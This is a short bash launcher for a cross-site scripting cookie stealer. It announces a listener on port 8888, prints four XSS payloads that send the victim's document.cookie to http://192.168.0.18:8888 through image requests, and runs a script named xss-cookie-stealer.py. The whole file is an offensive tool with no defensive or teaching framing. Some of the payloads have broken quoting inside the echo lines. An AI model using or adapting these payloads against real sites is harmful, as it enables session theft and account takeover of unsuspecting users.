#!/bin/bash
echo -e "[~] Opening new port 8888"
echo -e "[~] Inject XSS attack in victim and capture results here"
echo -e "[+] XSS Attack 1:  <script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>"
echo -e "[+] XSS Attack 2:  <img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie;>"
echo -e "[+] XSS Attack 3:  <img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">"
echo -e "[+] XSS Attack 4:  <script> alert(document.cookie); var i=new Image; i.src="http://192.168.0.18:8888/?"+document.cookie;</script>"
echo -e "[~] Loading Tool"
python xss-cookie-stealer.py
